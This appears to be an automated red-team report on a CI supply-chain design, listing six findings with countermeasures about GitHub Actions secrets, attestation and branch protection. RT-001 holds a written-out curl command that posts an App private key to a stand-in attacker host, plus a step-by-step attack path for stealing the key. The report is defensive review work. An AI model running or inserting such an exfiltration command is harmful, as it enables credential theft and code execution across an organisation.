# Red Team Report: ADR-001 / ADR-003 / phase1-requirements (Phase-2 Hardened Design)

**Strategy:** S-001 Red Team Analysis
**Deliverables:**
- `projects/PROJ-031-cowork-skeleton/decisions/ADR-001-skeleton-derived-branch-strategy.md`
- `projects/PROJ-031-cowork-skeleton/decisions/ADR-003-credential-protection-supply-chain.md`
- `projects/PROJ-031-cowork-skeleton/requirements/phase1-requirements.md`
**Supporting Evidence (not under review):** `security/phase2-stride-threat-model.md`, `security/phase2-attack-surface.md`
**Criticality:** C4
**Date:** 2026-06-29
**Reviewer:** jerry:adv-executor (blind, independent — Group C Challenge)
**H-16 Compliance:** S-003 Steelman present in `iteration-004/s-003-steelman-findings.md` (confirmed)
**Threat Actor:** Sophisticated insider-threat collaborator with `write` access to `geekatron/jerry` — goal: achieve durable code-execution on every org user's workstation by compromising the pipeline that produces `geekatron/jerry-cowork`; capabilities: full source-repo write, `workflow_dispatch` access, domain knowledge of the CI pipeline; motivation: widest possible blast radius from the single org-registration channel that delivers hooks to all users on session start.

---

## Document Sections

| Section | Purpose |
|---------|---------|
| [Summary](#summary) | Overall assessment and recommendation |
| [Findings Table](#findings-table) | All findings by severity and priority |
| [Detailed Findings](#detailed-findings) | Evidence, analysis, and countermeasures per finding |
| [Defense Gap Assessment](#defense-gap-assessment) | Prioritization matrix |
| [Scoring Impact](#scoring-impact) | Dimension mapping and overall assessment |
| [Execution Statistics](#execution-statistics) | Protocol step completion |

---

## Summary

The Phase-2 hardened design (dedicated repo, org-level ruleset, GitHub App token, Sigstore attestation, provenance gate) represents a substantive improvement over Phase-1 and correctly identifies and closes the direct-push Critical and the Release-notes anchor collapse. However, under sustained red-team pressure, **one Critical and two Major findings survive the hardening**. The Critical (RT-001) is a Phase-1 requirements gap: the App private key — which is **the sole bypass actor** for the protected branch — is accessible to any write-level collaborator via `workflow_dispatch` targeted at a malicious feature branch, because the requirements specify no mechanism to confine secrets to protected-branch workflows. If exploited, this converts the attacker into the sole bypass actor, nullifying D2 (prevention), D4 (attestation), and D5 (provenance gate). The two Majors are also requirements-level: a direct contradiction between REQ-020 (prohibits `id-token: write`) and REQ-042 (requires it for attestation), and the absence of any consumer-side attestation verification requirement that would close the distribution-channel integrity gap. Overall recommendation: **REVISE** — the Critical and both Majors must be addressed in requirements before Phase-5 implementation proceeds.

---

## Findings Table

| ID | Attack Vector | Category | Exploitability | Severity | Priority | Defense | Affected Dimension |
|----|---------------|----------|----------------|----------|----------|---------|-------------------|
| RT-001-20260629 | `workflow_dispatch` on a malicious feature branch exfiltrates the App private key — the sole bypass actor — allowing an attacker with write access to become the branch bypass actor | Boundary Violation | High | Critical | P0 | Missing | Methodological Rigor |
| RT-002-20260629 | REQ-020 explicitly forbids `id-token: write`; REQ-042 mandates it for Sigstore attestation — one must be violated at implementation time | Ambiguity Exploitation | High | Major | P0 | Missing | Internal Consistency |
| RT-003-20260629 | No requirement mandates consumer-side attestation verification; CoWork silently installs hooks — the attestation protects the monitor, not the distribution channel | Boundary Violation | Medium | Major | P1 | Partial | Evidence Quality |
| RT-004-20260629 | Faithful-derivative gate excludes `:!tests/` from the diff — does not verify the strip occurred; a workflow that omits `git rm tests/` passes the pre-push gate | Rule Circumvention | Low | Minor | P2 | Partial | Completeness |
| RT-005-20260629 | REQ-044 permits the meta-monitor to live in "the dedicated repo or source repo" — dedicated-repo placement may violate loop-safety; source-repo placement shares the threat root with what it monitors | Dependency Attack | Low | Minor | P2 | Partial | Methodological Rigor |
| RT-006-20260629 | No requirement mandates ongoing monitoring of the dedicated-repo protection posture — ruleset toggle, visibility change, or default-branch rename can occur silently | Degradation | Low | Minor | P2 | Partial | Completeness |

---

## Detailed Findings

### RT-001-20260629: `workflow_dispatch`-from-branch App Private Key Exfiltration [CRITICAL]

| Attribute | Value |
|-----------|-------|
| **Severity** | Critical |
| **Section** | ADR-003 D3 / D6; REQ-019; REQ-020 |
| **Strategy Step** | Step 2 (Boundary Violations) / Step 3 (Defense Gap) |

**Attack Vector:**

The GitHub App installation token (D3) is the sole bypass actor for the dedicated-repo ruleset (D2). The App's ID and private key are stored as source-repo Actions secrets. In GitHub Actions, `workflow_dispatch` can be triggered with a user-specified `ref`, running whichever version of the workflow file exists on that branch. An adversary with write access to `geekatron/jerry` executes this sequence:

1. Create `feature/evil` branch in `geekatron/jerry`.
2. On that branch, add a step to `cowork-skeleton.yml` that exfiltrates `$APP_PRIVATE_KEY` via an outbound HTTPS request to an attacker-controlled endpoint: `curl -sS -X POST https://attacker.io/collect -d "${{ secrets.APP_PRIVATE_KEY }}"` (or equivalent environment-variable reference — the permissions block cannot prevent outbound network calls).
3. Trigger `workflow_dispatch` via the GitHub API targeting `ref: feature/evil`.
4. GitHub runs `feature/evil`'s version of `cowork-skeleton.yml` with source-repo secrets injected.
5. The App private key is transmitted to the attacker.
6. The attacker mints installation tokens at will and is now functionally the sole bypass actor on `geekatron/jerry-cowork`.
7. The attacker force-pushes malicious hooks to the dedicated repo default branch.
8. All org users receive malicious `session-start.py` on their next CoWork session (blast radius: entire org, code execution on user workstations).
9. Detection window: ≤24 h from NFR-006 backstop — during which every affected user runs the malicious hook.

**Category:** Boundary Violation — the trust boundary between "protected App secret" and "any-branch workflow execution" has no control.

**Exploitability:** High — requires only write (collaborator) access to the source repo, which is the assumed threat actor. No exploit prerequisites beyond a feature branch and a `workflow_dispatch` API call.

**Existing Defense:**

- REQ-019 prohibits secrets in **CI logs and summaries** — does not prevent intentional exfiltration via network request.
- D6 runner hardening addresses `pull_request_target` (fork PRs) and untrusted metadata interpolation, but neither control targets `workflow_dispatch`-from-branch execution.
- REQ-020 restricts the `permissions:` block — does not prevent outbound network calls in workflow steps.

No defense exists against this vector in the current requirements or ADR decisions.

**Evidence:**

- ADR-003 D6: "The skeleton-push job MUST trigger only on verified release events (tags v* + workflow_dispatch) (never on PR events). Fork PRs cannot access secrets under `pull_request`." — D6's PR hardening explicitly addresses the fork-PR vector but is silent on `workflow_dispatch`-from-branch.
- ADR-003 D3: "The App private key becomes the project's single long-lived secret (c-208, CR-03) — a new but bounded surface, mitigated by storing it only in source-repo secrets, minimal access, and a rotation policy." — Storage in source-repo secrets is the stated mitigation, but source-repo secrets are accessible to any workflow run in the source repo, on any branch.
- REQ-019: "The CI workflow SHALL NOT cause any secret value... to appear in GitHub Actions logs, job summaries, or committed artifacts." — Log-focused scope does not cover outbound exfiltration.

**Dimension:** Methodological Rigor — the protection model asserts D3 is adequately guarded by secret storage, but the threat model (Phase-2 STRIDE) does not enumerate `workflow_dispatch`-from-branch as an explicit attack vector despite CR-03 identifying key theft as HIGH impact.

**Countermeasure:**

Add a new requirement (proposed REQ-045) mandating that the App private key (APP_PRIVATE_KEY) be stored in a **GitHub Actions Environment** (e.g., `skeleton-push`) configured with **deployment protection rules restricting access to the protected `main` branch only** (and optionally to `v*` tag refs). With environment-scoped secrets, `workflow_dispatch` runs from non-`main` branches cannot access the App credential. Pair with: (a) verify `GITHUB_REF_NAME` equals a `v*` tag or `main` at the start of any step that accesses the environment; (b) document that the Environment protection rule is a non-negotiable companion to the App credential — if the Environment is deleted or its branch restriction removed, the protection collapses to the pre-fix posture.

**Acceptance Criteria:** `gh api repos/geekatron/jerry/environments/skeleton-push` confirms an environment exists with `deployment_branch_policy: { protected_branches: true }` (or equivalent `custom_branch_policies` restricted to `main` / `v*` patterns); `workflow_dispatch` triggered from a non-`main` branch fails with "Environment protection rules" error when the step attempts to access APP_PRIVATE_KEY; a `workflow_dispatch` from `main` succeeds and mints a valid App token.

---

### RT-002-20260629: REQ-020 / REQ-042 Permission Contradiction — `id-token: write` Required but Explicitly Forbidden [MAJOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | REQ-020; REQ-042; ADR-003 D4 |
| **Strategy Step** | Step 2 (Ambiguity Exploitation) / Step 3 (Defense Gap) |

**Attack Vector:**

The design logic depends on REQ-042's build-provenance attestation as the **primary integrity anchor** (superseding the editable Release-notes SHA of Phase-1). GitHub's `gh attestation` command uses OIDC to mint a short-lived signing token for Sigstore. The `id-token: write` permission is required by GitHub for any workflow step that calls `actions/attest-build-provenance` or `gh attestation attest`. The `attestations: write` permission may also be required depending on GitHub's current API surface.

REQ-020 states: "The `permissions:` block in `cowork-skeleton.yml` SHALL declare `contents: write` as the **sole** permission entry and SHALL NOT include `actions: write`, `packages: write`, `id-token: write`, or any organization-level scope."

This creates a binary contradiction: either REQ-042 is implemented (attestation step added, `id-token: write` required) or REQ-020 is honored (only `contents: write` allowed). Both cannot be satisfied simultaneously. At implementation time, one will be violated — and the likely failure mode is that an implementer either silently adds `id-token: write` (violating REQ-020) or the attestation step fails at CI runtime (nullifying REQ-042 and removing the primary integrity anchor).

**Category:** Ambiguity Exploitation — the two requirements use identical mandatory language ("SHALL") and are irreconcilable without one being amended.

**Exploitability:** High (as an implementation failure) — this is not an adversarial exploit but a design self-defeat that will manifest as either a security violation or a failed attestation on first CI run implementing REQ-042.

**Existing Defense:** None. The contradiction is fully present in the requirements as written. The ADR-003 Section "S-010 Self-Refine Note" documents a review for over-claiming, but the REQ-020/REQ-042 conflict is not identified.

**Evidence:**

- REQ-020: "SHALL NOT include `actions: write`, `packages: write`, `id-token: write`, or any organization-level scope."
- REQ-042: "CI SHALL create an immutable GitHub Release and a build-provenance attestation (Sigstore-backed, SLSA-aligned, e.g., `gh attestation`) binding the skeleton tip SHA to the specific workflow run."
- GitHub Docs (Artifact Attestations): `id-token: write` is a mandatory permission for `actions/attest-build-provenance` and for `gh attestation attest` (OIDC token required to sign with Sigstore). Without it, the attestation action fails with "Error: The `id-token: write` permission is required."
- ADR-003 D4: "Verification compares against the attestation, **never** against editable Release-notes text." — D4 designates the attestation as the primary anchor; if REQ-020 blocks attestation, the primary anchor is gone and Phase-1's weakened posture (editable Release notes backstop only) re-emerges.

**Dimension:** Internal Consistency — the requirements set is self-contradictory at the security-critical intersection of credential scope and integrity mechanism.

**Countermeasure:**

Amend REQ-020 to read: "The `permissions:` block in `cowork-skeleton.yml` SHALL declare `contents: write` as the **minimum** permissions and SHALL NOT include `actions: write`, `packages: write`, or any organization-level scope. When the attestation step (REQ-042) is present in the same job, `id-token: write` and `attestations: write` are additionally permitted as required for Sigstore signing, and SHALL NOT exceed the scope of those two additions." Add a traceability note to REQ-042: "requires `id-token: write` and `attestations: write` in the `permissions:` block; see REQ-020 for the permitted exception."

**Acceptance Criteria:** REQ-020 is amended and the amended text appears in the requirements document; the `cowork-skeleton.yml` workflow declares exactly `{ contents: write, id-token: write, attestations: write }` (or the two-permission variant if `attestations: write` proves unnecessary); REQ-042 AC (b) — `gh attestation verify` exits zero — passes in a live CI run.

---

### RT-003-20260629: Consumer-Side Attestation Verification Gap [MAJOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Major |
| **Section** | ADR-003 D4; REQ-042; REQ-043 |
| **Strategy Step** | Step 2 (Boundary Violations) / Step 3 (Defense Gap) |

**Attack Vector:**

The attestation (D4) is described as "publicly verifiable via `gh attestation verify`" and serves as the integrity anchor. However, the distribution channel is: `geekatron/jerry-cowork` default branch → CoWork server-side marketplace → user workstation hooks execution. At no point in this chain does any party verify the attestation before running the hooks:

1. **CoWork itself:** The CoWork client is a git clone operation — it does not call `gh attestation verify`. It materializes the tip working tree and executes hooks.
2. **The org-admin registration step (REQ-043):** REQ-043 mandates a runbook, admin approvals, and a canonical repo name — but does not require the admin to verify the attestation before registering the repo.
3. **Individual users:** No requirement or documentation instructs users to run `gh attestation verify` before trusting the plugin.

Therefore: if an attacker bypasses D2 (branch protection — e.g., via the RT-001 App key theft, or a future admin-suppression of the ruleset), the detection window is entirely determined by the monitor (NFR-006), not by any consumer-side check. During the ≤24h window, malicious hooks execute on every user workstation. The attestation provides integrity for the monitor's reference value but provides zero protection to the distribution channel itself.

**Category:** Boundary Violation — there is no integrity enforcement at the consumer boundary (the point where the artifact is installed and hooks run).

**Exploitability:** Medium — exploiting this gap requires first bypassing D2 (protected branch), which RT-001 enables at Critical severity. Once D2 is bypassed, RT-003 means users receive and execute the malicious artifact with no consumer-side check.

**Existing Defense:** Partial — the backstop monitor (NFR-006) eventually detects the tampered tip SHA vs. the attestation; the ≤24h detection SLA bounds the exposure window. But detection after the fact, with a 24h window, is weak protection for an executable-hooks artifact delivered to all org users.

**Evidence:**

- ADR-003 D4: "Verification compares against the attestation, **never** against editable Release-notes text." — The "verification" described is for the monitor, not for consumers.
- ADR-003 L2 Implication #4: "A credible SLSA path... makes the skeleton's lineage cryptographically verifiable end-to-end." — SLSA end-to-end verification requires a verifier at the consumer end; without it, SLSA Level 3 provenance exists but is not enforced.
- REQ-043 AC: "Runbook exists at `runbooks/org-registration.md` containing canonical repo full name, registration change protocol, and quarterly audit schedule." — No mention of attestation verification in the registration protocol.
- ADR-003 L0: "That blast radius justifies prevention-by-default plus verifiable provenance." — The design correctly identifies the blast radius but does not close the consumer-side verification gap.

**Dimension:** Evidence Quality — the integrity evidence (attestation) exists but is not verified at the point of use; its evidentiary value is available only to the monitor, not to the distribution channel.

**Countermeasure:**

Add a new requirement (proposed REQ-046): "The org-admin registration runbook (REQ-043) SHALL include a step requiring the registering admin to run `gh attestation verify <latest-skeleton-tip-sha> --repo geekatron/jerry` and confirm exit zero before completing the registration or re-registration of `geekatron/jerry-cowork` as the canonical org source." Additionally, the How-To troubleshooting guide (REQ-027) SHOULD document `gh attestation verify` as the user-available integrity check. If CoWork exposes a plugin-verification hook in a future release, REQ-042 SHOULD be extended to require that hook.

**Acceptance Criteria:** `runbooks/org-registration.md` contains an explicit step: "Run `gh attestation verify $(git rev-parse HEAD) --repo geekatron/jerry` in a checkout of `geekatron/jerry-cowork`; confirm exit zero before completing registration"; REQ-043 AC references attestation verification as a required protocol step.

---

### RT-004-20260629: Faithful-Derivative Gate Does Not Verify Strip Completeness [MINOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Section** | REQ-022 |
| **Strategy Step** | Step 2 (Rule Circumvention) |

**Attack Vector:**

REQ-022's faithful-derivative gate runs before the push:
```bash
git diff --quiet "${TAG}..HEAD" -- ':!projects/' ':!tests/'
```

The exclusion patterns `:!projects/` and `:!tests/` remove both stripped directories from the diff scope. If a workflow omits `git rm -r tests/` (whether accidentally or by a malicious implementer who has previously bypassed main protection), the gate produces an empty diff (no change outside projects/ or tests/ is detected) and passes silently. The artifact shipped would include the full `tests/` tree, but no pre-push CI gate would catch it. The artifact would be non-faithful to the strip contract and larger than intended.

The only formal verification that `tests/` was actually stripped is in REQ-005's acceptance criterion (`git ls-files tests/` returns empty) and REQ-002's acceptance criterion (total file count ≈ 1,417) — both of which are post-build tests, not in-CI pre-push gates.

**Category:** Rule Circumvention — the gate correctly verifies faithfulness of the retained surface but does not verify that the stripping of the specified directories actually occurred.

**Exploitability:** Low — requires either a workflow implementation error or prior bypass of main branch protection. The consequence is a non-minimal artifact (oversized), not a malicious one.

**Existing Defense:** Partial — REQ-006 (file count < 5,000) and REQ-002/REQ-005 acceptance criteria serve as post-build checks. REQ-006's hard-fail at 5,000 files would only trigger if tests/ is very large (it is not — tests/ contributes fewer than the 5,000 threshold allows).

**Evidence:**

- REQ-022: "`git diff --quiet "${TAG}..HEAD" -- ':!projects/' ':!tests/'` — ... exclusion patterns `:!projects/` `:!tests/` scope the diff to the retained-surface files only."
- REQ-002 AC: "`git ls-files tests/` returns empty" — this is an acceptance criterion (post-build), not a CI gate.

**Dimension:** Completeness — the pre-push gate does not fully verify the strip contract.

**Countermeasure:** Add a strip-verification step immediately after `git rm -r projects/ tests/` and before the faithful-derivative gate: `git ls-files tests/ | { read -n 1 && echo "::error::tests/ not fully stripped" && exit 1 || true; }` (or equivalent). This is a minor addition to the CI implementation spec in REQ-022 or a new sub-requirement within WS-3.

**Phase classification:** Phase-3 implementation concern — REQ-022's gate design is defensible as a faithfulness check; adding an explicit strip-completion assertion is an implementation hardening, not a requirements redesign. Flag for the implementation story.

---

### RT-005-20260629: Meta-Monitor Placement Underspecified — Loop-Safety or Trust-Root Gap [MINOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Section** | REQ-044 |
| **Strategy Step** | Step 2 (Dependency Attacks) |

**Attack Vector:**

REQ-044 AC states: "Meta-monitor workflow exists in the **dedicated repo or source repo**." The choice of placement is left unspecified and creates two distinct risks:

- **If placed in the dedicated repo (`geekatron/jerry-cowork`):** ADR-003 D1 establishes loop-safety by asserting the dedicated repo has "no push-back workflows." A meta-monitor workflow that opens GitHub Issues in the source repo writes to the source repo, which may constitute a "push-back" in spirit even if not in git-push form. More concretely: the dedicated repo having any active workflow means the CI-from-source-push can trigger workflows in the dedicated repo, requiring loop-safety analysis for this specific workflow.
- **If placed in the source repo:** The meta-monitor shares its trust root with the monitored system (both live in `geekatron/jerry`). A CI compromise of the source repo could suppress both the backstop monitor and its watchdog simultaneously.

The requirements document does not analyze either placement option against ADR-003's loop-safety model (CR-02) or perform a trust-root assessment.

**Category:** Dependency Attack — the watchdog's effectiveness is dependent on its placement relative to the system it monitors.

**Exploitability:** Low — an attacker who has already compromised CI sufficiently to disable the backstop monitor likely has capabilities that render the meta-monitor gap secondary.

**Existing Defense:** Partial — NFR-006 and REQ-044 together describe the monitoring architecture; the underspecification is in the placement analysis, not in the monitoring intent.

**Evidence:**

- REQ-044 AC: "Meta-monitor workflow exists in the **dedicated repo or source repo**."
- ADR-003 D1: "the dedicated repo has no push-back workflows (read/monitor only)" — whether a GitHub Issues–writing workflow constitutes a "push-back" is ambiguous.
- ADR-003 CR-02: "Loop-safety is re-established topologically: the dedicated repo has no push-back workflows... This invariant must be asserted in config and review."

**Dimension:** Methodological Rigor — the monitoring architecture has an unresolved placement question.

**Countermeasure:** Resolve the placement in REQ-044: specify "source repo" (avoiding dedicated-repo loop-safety complexity) and add a note that the meta-monitor's trust root limitation (shared CI environment) is an accepted residual, mitigated by the source repo's `main`-branch protection and the independent CR-02 topological guarantee. If placing in the dedicated repo, explicitly analyze the `issues: write` action against ADR-003's "no push-back workflows" invariant.

**Phase classification:** Phase-1 requirements gap — the underspecification should be resolved before implementation.

---

### RT-006-20260629: Dedicated-Repo Protection Posture Has No Ongoing Monitoring Requirement [MINOR]

| Attribute | Value |
|-----------|-------|
| **Severity** | Minor |
| **Section** | ADR-003 D2; REQ-040 |
| **Strategy Step** | Step 2 (Degradation Paths) |

**Attack Vector:**

REQ-040 mandates the org-level ruleset be present and active. However, the requirements do not include a monitoring requirement for the ongoing posture of `geekatron/jerry-cowork` — specifically:

- **Visibility change:** If the repo is made private (by accident or by a rogue admin), CoWork cannot clone it and all users silently lose the plugin. No alert.
- **Default-branch rename:** If the default branch is renamed from `skeleton` to anything else, CoWork's default-branch clone would fail or clone an incorrect tree. No alert.
- **Ruleset suppression (DR-02):** An org admin could toggle the org-level ruleset. REQ-040 mandates it be non-overridable by repo admins — but "org admins cannot override" is distinct from "org admins cannot disable the org-level ruleset." If the ruleset is disabled at the org level, D2 collapses silently. ADR-003 D2 mentions "audit-log alert on ruleset change" but no formal REQ captures this.

**Category:** Degradation — protection posture can silently degrade without triggering any alert in the current requirements.

**Exploitability:** Low — requires admin-level compromise or error.

**Existing Defense:** Partial — REQ-043 mandates periodic audit of the registered source (≤ quarterly), which would eventually surface a visibility change. But quarterly is too infrequent for a code-execution artifact. ADR-003 mentions monitors on visibility/default-branch/ruleset in Consequences §Negative but no REQ formalizes these.

**Evidence:**

- ADR-003 Consequences §Negative: "A second repo to operate. Additional surface (settings drift, visibility, default-branch name). *Mitigation:* monitors on visibility/default-branch/ruleset; recovery runbook (DR-04/05)." — Mitigation is stated but not required.
- REQ-040 AC: Confirms ruleset is active at setup; no scheduled re-confirmation.
- REQ-043 AC: "periodic registered-source verification schedule (≤ quarterly audit)" — inadequate cadence for a code-execution artifact.

**Dimension:** Completeness — the protection architecture has ongoing posture requirements for generation (REQ-034d) and integrity (NFR-006) but not for the dedicated-repo protection posture itself.

**Countermeasure:** Add a sub-requirement to NFR-006 (or a new REQ-047) mandating that the scheduled backstop monitor (NFR-006) also verify: (a) `geekatron/jerry-cowork` visibility is PUBLIC; (b) default branch name has not changed from the registered value; (c) the org-level ruleset targeting `geekatron/jerry-cowork` is present and active. On any mismatch, open a GitHub issue (same mechanism as staleness/tamper detection).

**Phase classification:** Phase-1 requirements gap — the monitoring scope is underspecified relative to the stated risks in ADR-003.

---

## Defense Gap Assessment

| Finding | Severity | Priority | Defense Status | Classification |
|---------|----------|----------|----------------|----------------|
| RT-001-20260629 (workflow_dispatch App key exfiltration) | Critical | P0 | Missing — no control in requirements or ADRs | Phase-1 requirements gap; blocks Phase-5 |
| RT-002-20260629 (REQ-020 / REQ-042 contradiction) | Major | P0 | Missing — one requirement will be violated at implementation | Phase-1 requirements gap; must be resolved before implementation |
| RT-003-20260629 (consumer-side attestation verification) | Major | P1 | Partial — monitor verifies, but distribution channel does not | Phase-1 requirements gap |
| RT-004-20260629 (gate doesn't verify strip) | Minor | P2 | Partial — post-build tests cover this | Phase-3 implementation concern |
| RT-005-20260629 (meta-monitor placement) | Minor | P2 | Partial — monitoring intent is present | Phase-1 requirements gap (underspecification) |
| RT-006-20260629 (posture monitoring absent) | Minor | P2 | Partial — quarterly org audit partially covers it | Phase-1 requirements gap |

---

## Scoring Impact

| Dimension | Weight | Finding Impact | Net Assessment |
|-----------|--------|---------------|----------------|
| Completeness | 0.20 | RT-004 (minor), RT-006 (minor) | Negative — monitoring and gate completeness gaps |
| Internal Consistency | 0.20 | RT-002 (major) | Negative — direct requirements contradiction |
| Methodological Rigor | 0.20 | RT-001 (critical), RT-005 (minor) | Strongly negative — the primary defense (protected branch + App token) is defeatable via the unconstrained `workflow_dispatch`-from-branch attack |
| Evidence Quality | 0.15 | RT-003 (major) | Negative — attestation evidence available but not enforced at consumer boundary |
| Actionability | 0.15 | RT-001, RT-002, RT-003 (all have specific countermeasures) | Positive — each finding has a specific, bounded countermeasure |
| Traceability | 0.10 | All findings trace to specific requirement IDs | Neutral — traceability to findings is present |

**Overall Assessment:** REVISE — the design is substantially improved from Phase-1 and the direction is sound. The Critical (RT-001) is a genuine architectural gap in the credential protection model that the App-token-as-sole-bypass-actor pattern introduces. The two Majors (RT-002, RT-003) are requirements-level self-defeats. All three have specific, implementable countermeasures. Estimated composite score impact of countermeasures: +0.08 to +0.12 (primarily from closing RT-001 which impacts the highest-weight Methodological Rigor dimension). None of the findings require redesigning the core architecture; D1–D6 remain valid after countermeasures are applied.

---

## Execution Statistics

- **Total Findings:** 6
- **Critical:** 1 (RT-001)
- **Major:** 2 (RT-002, RT-003)
- **Minor:** 3 (RT-004, RT-005, RT-006)
- **Protocol Steps Completed:** 5 of 5
  - Step 1: Threat actor defined (write-level collaborator, `workflow_dispatch` access, executable-hooks blast radius motivation)
  - Step 2: 6 attack vectors enumerated across all 5 MITRE ATT&CK–adapted categories
  - Step 3: Defense gap assessment with P0/P1/P2 prioritization
  - Step 4: Countermeasures with specific acceptance criteria for P0 and P1 findings
  - Step 5: Scoring impact table and overall assessment produced
- **H-15 Self-Review:** Applied — confirmed all findings cite specific requirement IDs or ADR section references; severity classifications checked against template definitions; no findings minimized; summary table is consistent with detailed findings section.

---

*Generated by:* jerry:adv-executor (S-001 Red Team Analysis — blind, independent, Group C Challenge)
*Template:* `.context/templates/adversarial/s-001-red-team.md` v1.0.0
*Execution ID:* 20260629
*Format:* Per S-001 Output Format specification
